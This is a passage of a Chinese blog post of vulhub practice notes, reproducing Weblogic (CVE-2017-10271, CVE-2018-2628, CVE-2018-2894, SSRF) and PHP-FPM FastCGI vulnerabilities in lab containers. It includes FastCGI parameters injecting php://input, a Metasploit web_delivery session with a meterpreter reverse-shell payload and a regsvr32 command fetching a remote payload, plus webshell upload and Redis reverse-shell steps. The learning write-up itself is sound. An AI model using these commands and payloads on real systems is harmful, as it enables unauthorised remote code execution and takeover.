class="string">'DOCUMENT_ROOT'</span>: <span class="string">'/var/www/html'</span>,</span><br><span class="line">    <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">    <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'REMOTE_PORT'</span>: <span class="string">'12345'</span>,</span><br><span class="line">    <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">    <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">    <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span></span><br><span class="line">    <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">    <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>直接使用exp进行利用：（exp地址：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a> ）<br><img src="./Qi4K7e6.png" alt></p>
<hr>
<p>帮助选项：<br><img src="./MCUzhIC.png" alt></p>
<h3 id="知识总结-8"><a href="#知识总结-8" class="headerlink" title="知识总结"></a>知识总结</h3><p>一个有趣的漏洞，原理P神讲得太透彻了，exp也很好用。<br>好好学习，天天向上。</p>
<h2 id="Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）"><a href="#Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）"></a>Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）</h2><p>weblogic还不是很熟悉，这几天把weblogic的洞都过一遍，工具一把梭。</p>
<h3 id="相关介绍-9"><a href="#相关介绍-9" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Weblogic的<strong>WLS Security组件对外提供webservice服务</strong>，其中使用了<strong>XMLDecoder来解析用户传入</strong>的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
<h3 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>P神的docker搭建好后没有反应，用的春哥的docker<br><img src="./ZIgwg7n.png" alt></p>
<p>console控制台<br><img src="./IvB4k0T.png" alt></p>
<hr>
<p>直接上工具：</p>
<ul>
<li><img src="./sTeqYnk.png" alt></li>
<li><img src="./5egn7et.png" alt></li>
</ul>
<p>用的太舒服了 </p>
<h3 id="知识总结-9"><a href="#知识总结-9" class="headerlink" title="知识总结"></a>知识总结</h3><p>java的洞实在是太多了</p>
<h2 id="Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h2><p>Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。</p>
<h3 id="相关介绍-10"><a href="#相关介绍-10" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可<strong>导致未授权的用户在远程服务器执行任意命令。</strong></p>
<h3 id="漏洞复现-10"><a href="#漏洞复现-10" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>服务器重装了<code>docker</code>和<code>docker-compose</code>。<br>访问<code>http://47.103.117.169:22312/console</code>，环境需要配置，等待即可。<br>直接使用工具：</p>
<ul>
<li><ol>
<li>验证有无该漏洞<br>这一步失败了，脚本执行不成功。不管它</li>
</ol>
</li>
<li><ol start="2">
<li>上传shell<br>k8gege提供了两种方法：<code>.NET的GUI界面</code>和<code>命令行界面</code>（偏爱GUI）<br><img src="./hanX4FF.png" alt><br><img src="./KRXYwHh.png" alt></li>
</ol>
</li>
<li><ol start="3">
<li>getshell<br>这里有点问题，服务端的问题。<br>这个shell上传之后，执行一次命令就会失效，所以采用反弹shell。<br>命令执行使用：<br>K8飞刀<br><img src="./dcDyGjC.png" alt><br>脚本：<br><img src="./kf9ZcDK.png" alt></li>
</ol>
</li>
<li><ol start="4">
<li><p>获得meterpreter</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/script/web_delivery </span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> target 3</span><br><span class="line">target =&gt; 3</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> lhost 192.168.91.148</span><br><span class="line">lhost =&gt; 192.168.91.148</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> lport 2333</span><br><span class="line">lport =&gt; 2333</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; exploit </span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.91.148:2333 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/ei8mHaBXvn4n</span><br><span class="line">[*] Local IP: http://192.168.91.148:8080/ei8mHaBXvn4n</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.91.148:8080/ei8mHaBXvn4n.sct scrobj.dll</span><br></pre></td></tr></table></figure>
<p>然后目标cmd执行：<code>regsvr32 /s /n /u /i:http://192.168.91.148:8080/ei8mHaBXvn4n.sct scrobj.dll</code><br><code>sessions -i 1</code> 进入meterpreter即可<br>注意：以上是针对Windows系统。<code>lhost</code> <code>lport</code>设置为自己的IP和port，由于题目是放在公网上的，而我的另一台攻击服务器没有安装msf，故无法复现。</p>
</li>
</ol>
</li>
</ul>
<h3 id="知识总结-10"><a href="#知识总结-10" class="headerlink" title="知识总结"></a>知识总结</h3><p>真好玩</p>
<h2 id="Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>Weblogic 任意文件上传漏洞（CVE-2018-2894）</h2><h3 id="相关介绍-11"><a href="#相关介绍-11" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，<code>Web Service Test Page</code> <strong>在“生产模式”下默认不开启，所以该漏洞有一定限制。</strong></p>
<p>利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。</p>
<h3 id="漏洞复现-11"><a href="#漏洞复现-11" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个漏洞环境真的是，sad <strong>.<code>_</code>.</strong><br>漏洞的利用需要登录到控制台界面，查看weblogic登陆密码如下图：<br><img src="./VQvYoL2.png" alt></p>
<p>登录后台页面，点击<code>base_domain</code>的配置，在“高级”中开启“启用 Web 服务测试页”选项：<br><img src="./CsKUfX7.png" alt></p>
<p>访问<code>http://47.103.117.169:22313/ws_utc/config.do</code>，设置<code>Work Home Dir</code>为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。要将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。<br><img src="./vxxF6zN.png" alt></p>
<p>然后点击安全 -&gt; 增加，然后上传webshell<br><strong>图略</strong></p>
<hr>
<p>上传后，查看返回的数据包，返回的XML中有时间戳<br>然后访问<code>http://47.103.117.169:22313/ws_utc/css/config/keystore/[时间戳]_[文件名]</code>，即可执行webshell<br><strong>无图</strong>sad<br>jsp马真的是。。<br>上传了好几个都不行，马中包含中文都编译不了。。<br>放弃，不像<code>tomcat</code>后台那个洞一样舒服！</p>
<h3 id="知识总结-11"><a href="#知识总结-11" class="headerlink" title="知识总结"></a>知识总结</h3><p>玩得不开心，没有总结。</p>
<h2 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h2><h3 id="相关介绍-12"><a href="#相关介绍-12" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击<code>内网</code>中redis、fastcgi等脆弱组件。</p>
<h3 id="漏洞复现-12"><a href="#漏洞复现-12" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>根据P神的漏洞环境，直接访问<code>http://47.103.117.169:22314/uddiexplorer/SearchPublicRegistries.jsp</code>，利用burp抓包修改某些参数，即可达到ssrf的目的。</p>
<p>关键参数：<code>operator</code><br>探测一个开放的端口<br><img src="./e1R4ApP.png" alt></p>
<p>当修改参数为一个不存在的端口时，返回的响应数据不同，或者迟迟没有响应。</p>
<blockquote>
<p>通过错误的不同，即可探测内网状态。</p>
</blockquote>
<p><strong>注入HTTP头，利用Redis反弹shell</strong></p>
<p>Weblogic的SSRF有一个比较大的特点，其虽然是一个”GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。<br>redis服务的默认端口为<code>6379</code><br>在docker的内网中已经安装好redis服务，docker0的内网IP为<code>172.18.0.1</code><br><img src="./23iJqT7.png" alt></p>
  </article>
  <aside class="table-content" id="site-toc">
  <div class="table-content-title">
    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
    <span>目录</span>
  </div>
  <div class="table-content-main">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#AppWeb认证绕过漏洞（CVE-2018-8715）"><span class="toc-text">AppWeb认证绕过漏洞（CVE-2018-8715）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关介绍"><span class="toc-text">相关介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识总结"><span class="toc-text">知识总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><span class="toc-text">Apache HTTPD 换行解析漏洞（CVE-2017-15715）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关介绍-1"><span class="toc-text">相关介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-1"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识总结-1"><span class="toc-text">知识总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-HTTPD-多后缀解析漏洞"><span class="toc-text">Apache HTTPD 多后缀解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关介绍-2"><span class="toc-text">相关介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-2"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识总结-2"><span class="toc-text">知识总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-SSI-远程命令执行漏洞"><span class="toc-text">Apache SSI 远程命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关介绍-3"><span class="toc-text">相关介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-3"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识总结-3"><span class="toc-text">知识总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Aria2-任意文件写入漏洞"><span class="toc-text">Aria2 任意文件写入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关介绍-4"><span class="toc-text">相关介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-4"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识总结-4"><span class="toc-text">知识总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Django-debug-page-XSS漏洞（CVE-2017-12794）"><span class="toc-text">Django debug page XSS漏洞（CVE-2017-12794）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关介绍-5"><span class="toc-text">相关介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-5"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识总结-5"><span class="toc-text">知识总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Django-lt-2-0-8-任意URL跳转漏洞（CVE-2018-14574）"><span class="toc-text">Django &lt; 2.0.8 任意URL跳转漏洞（CVE-2018-14574）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关介绍-6"><span class="toc-text">相关介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-6"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识总结-6"><span class="toc-text">知识总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）"><span class="toc-text">Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关介绍-7"><span class="toc-text">相关介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-7"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识总结-7"><span class="toc-text">知识总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-FPM-Fastcgi-未授权访问漏洞"><span class="toc-text">PHP-FPM Fastcgi 未授权访问漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关介绍-8"><span class="toc-text">相关介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#基础知识"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nginx（IIS7）解析漏洞"><span class="toc-text">Nginx（IIS7）解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-8"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识总结-8"><span class="toc-text">知识总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）"><span class="toc-text">Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关介绍-9"><span class="toc-text">相关介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-9"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识总结-9"><span class="toc-text">知识总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><span class="toc-text">Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关介绍-10"><span class="toc-text">相关介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-10"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识总结-10"><span class="toc-text">知识总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）"><span class="toc-text">Weblogic 任意文件上传漏洞（CVE-2018-2894）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关介绍-11"><span class="toc-text">相关介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-11"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识总结-11"><span class="toc-text">知识总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic-SSRF漏洞"><span class="toc-text">Weblogic SSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关介绍-12"><span class="toc-text">相关介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-12"><span class="toc-text">漏洞复现</span></a></li></ol></li></ol>
  </div>
</aside>
  
    <aside class="passage-copyright">
      <div>本文作者: FengHLZ</div>
      
        <div>
          原文链接: 
          <a href="" target="_blank">https://www.fenghlz.xyz/passages/vulhub练习笔记/</a>
        </div>
      
      <div>
        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
      </div>
    </aside>
  
  
</div>

    </main>
    
      <div class="site-comment-contanier">
  <p id="site-comment-info">
    <i class="fa fa-spinner fa-spin"></i> 评论加载中
  </p>
  <div id="site-comment">
  </div>
</div>
    
    <div class="site-footer-wrapper">
  <footer class="site-footer">
    
      <div class="site-footer-col">
        <h5 class="site-footer-title">博客推荐</h5>
        
          <span class="site-footer-item">
            <a href="https://godbmw.com/" target="_blank">GodBMW</a>
          </span>
        
          <span class="site-footer-item">
            <a href="https://www.liaoxuefeng.com/" target="_blank">廖雪峰的官方网站</a>
          </span>
        
      </div>
    
      <div class="site-footer-col">
        <h5 class="site-footer-title">系列教程</h5>
        
          <span class="site-footer-item">
            <a href="https://godbmw.com/leetcode/" target="_blank">Leetcode解题报告</a>
          </span>
        
          <span class="site-footer-item">
            <a href="https://segmentfault.com/markdown" target="_blank">Markdown语法手册</a>
          </span>
        
          <span class="site-footer-item">
            <a href="https://godbmw.com/passages/2019-03-03-theme-ad-docs-zh/" target="_blank">Theme Art Design 中文文档</a>
          </span>
        
      </div>
    
      <div class="site-footer-col">
        <h5 class="site-footer-title">书签</h5>
        
          <span class="site-footer-item">
            <a href="https://leancloud.cn/" target="_blank">LeanCloud</a>
          </span>
        
          <span class="site-footer-item">
            <a href="https://blog.csdn.net/skykingf/article/details/50498808" target="_blank">Win10下 sublime + xdebug 调试php</a>
          </span>
        
      </div>
    
      <div class="site-footer-col">
        <h5 class="site-footer-title">在线工具</h5>
        
          <span class="site-footer-item">
            <a href="https://www.ilovepdf.com/zh-cn" target="_blank">iLovePDF</a>
          </span>
        
          <span class="site-footer-item">
            <a href="https://www.iloveimg.com/zh-cn" target="_blank">iLoveIMG</a>
          </span>
        
          <span class="site-footer-item">
            <a href="http://www.mdtr2pdf.com/index.html" target="_blank">MDtr2PDF</a>
          </span>
        
      </div>
    
    <div class="site-footer-info">
      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
    </div>
    
      <div class="site-footer-info">
        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
      </div>
    
    
      <div class="site-footer-info">
        <i class="fa fa-at"></i> Email: 2362929771@qq.com
      </div>
    
    <div class="site-footer-info">
      <i class="fa fa-copyright"></i> 
      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
      Created by <a href="https:/godbmw.com/" target="_blank">GodBMW</a>.
      All rights reserved.
    </div>
  </footer>
</div>
    <div id="site-layer" style="display:none;">
  <div class="site-layer-content">
    <div class="site-layer-header">
      <span class="site-layer-header-title" id="site-layer-title"></span>
      <i class="fa fa-close" id="site-layer-close"></i>
    </div>
    <div class="site-layer-body" id="site-layer-container">
      <div class="site-layer-input" id="site-layer-search" style="display: none;">
        <input type="text">
        <i class="fa fa-search"></i>
      </div>
      <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
        
          <div>
            <img src="/images/wechatpay.png" alt="WeChat">
            
              <p>WeChat</p>
            
          </div>
        
          <div>
            <img src="/images/alipay.jpg" alt="AliPay">
            
              <p>AliPay</p>
            
          </div>
        
      </div>
      <div id="site-layer-welcome" style="display:none;"></div>
    </div>
  </div>
</div>
    

<div class="bottom-bar">
  <div class="bottom-bar-left">
    <a href="/passages/AWD攻略笔记/" data-enable="true">
      <i class="fa fa-arrow-left"></i>
    </a>
    <a href="/passages/2019-6-12-对本地三个MySQL数据库进行管理/" data-enable="true">
      <i class="fa fa-arrow-right"></i>
    </a>
  </div>
  <div class="bottom-bar-right">
    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
      <i class="fa fa-bars"></i>
    </a>
    
      <a href="#site-comment" data-enable="true">
        <i class="fa fa-commenting"></i>
      </a>
    
    <a href="javascript:void(0);" id="site-toggle-share-btn">
      <i class="fa fa-share-alt"></i>
    </a>
    <a href="javascript:void(0);" id="site-reward">
      <i class="fa fa-thumbs-up"></i>
    </a>
    <a href="javascript:void(0);" id="back-top-btn">
      <i class="fa fa-chevron-up"></i>
    </a>
  </div>
</div>
    <div id="share-btn">
  
    <a id="share-btn-twitter" href="javascript:void(0);" target="_blank">
      <i class="fa fa-twitter"></i>
    </a>
  
  
    <a id="share-btn-facebook" href="javascript:void(0);" target="_blank">
      <i class="fa fa-facebook"></i>
    </a>
  
  
    <a id="share-btn-weibo" href="javascript:void(0);" target="_blank">
      <i class="fa fa-weibo"></i>
    </a>
  
  
    <a id="share-btn-qq" href="javascript:void(0);" target="_blank">
      <i class="fa fa-qq"></i>
    </a>
  
  
    <a id="share-btn-wechat" href="javascript:void(0);" target="_blank">
      <i class="fa fa-wechat"></i>
    </a>
  
</div>
    
  <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
  <script async>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', '');
  </script>



  <script async>
  (function(){
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      }
      else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
  })();
  </script>



  <script async>
    (function(){
    var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?":"https://jspassport.ssl.qhimg.com/11.0.1.js?";
    document.write('<script src="' + src + '" id="sozz"><\/script>');
    })();
  </script>


  </body>
</html>